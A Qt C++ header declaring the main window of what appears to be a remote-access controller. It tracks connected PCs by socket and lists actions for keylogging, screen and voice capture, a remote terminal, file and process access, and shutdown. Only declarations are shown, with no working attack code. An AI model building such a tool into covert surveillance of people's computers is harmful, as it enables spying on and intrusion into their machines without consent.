//#if _MSC_VER >= 1600
//#pragma execution_character_set("utf-8")
//#endif
#pragma once
#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QLabel>
#include <QMenu>
#include <QTableWidget>
#include <QTabWidget>
#include <QAction>
#include <QGridLayout>
#include <QCloseEvent>
#include <winsock2.h>
#include <QMutex>
#include "mylistenWindows.h"


namespace Ui {
class MainWindow;
}

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    explicit MainWindow(QWidget *parent = nullptr);
    ~MainWindow();

public slots:

    void addLog(QString,int);
    void addInfo(SOCKET s);
    void setInfo(SOCKET s,int col,QString m);
    void delInfo(SOCKET s);
    void setListenState(QString str);
    void ShowInfoMenu(const QPoint& pos);
    void ShowLogMenu(const QPoint& pos);
    void refresh_triggered();
    void keylog_triggered();
    void process_triggered();
    void file_triggered();
    void screen_triggered();
    void terminal_triggered();
    void voice_triggered();
    void nickname_triggered();
    void disconnect_triggered();
    void clearNM_triggered();
    void delete_triggered();
    void clear_triggered();
    void copy_triggered();
    void export_triggered();
    void shutdown_triggered();
    void mute_triggered();
    void listen_triggered();
    void exit_triggered();
protected:
     void closeEvent(QCloseEvent *event);

private:
    Ui::MainWindow *ui;
    long mid;
    QMutex* infomut;
    QGridLayout* gridlayout1;
    QTableWidget* info,*log;
    QTabWidget* tabinfo;
    QLabel* myIP,* myListenState,*numOfPC ;//状态栏上的3个标签
    QMenu* info_menu,*log_menu;//右键菜单
    QAction *a_file,*a_screen,*a_voice,*a_clear,*a_terminal,*a_listen;//info动作

    QAction *a_shutdown,*a_disconnect,*a_mute,*a_process,*a_keylog,*a_refresh,*a_exit;
    QAction *a_nickname;
    QAction *log_delete,*log_clear,*log_copy,*log_export;//log4个动作

    mylistenWindows* winlis;

    QString getSelectInfoCol(int);
    void init();


};

#endif // MAINWINDOW_H
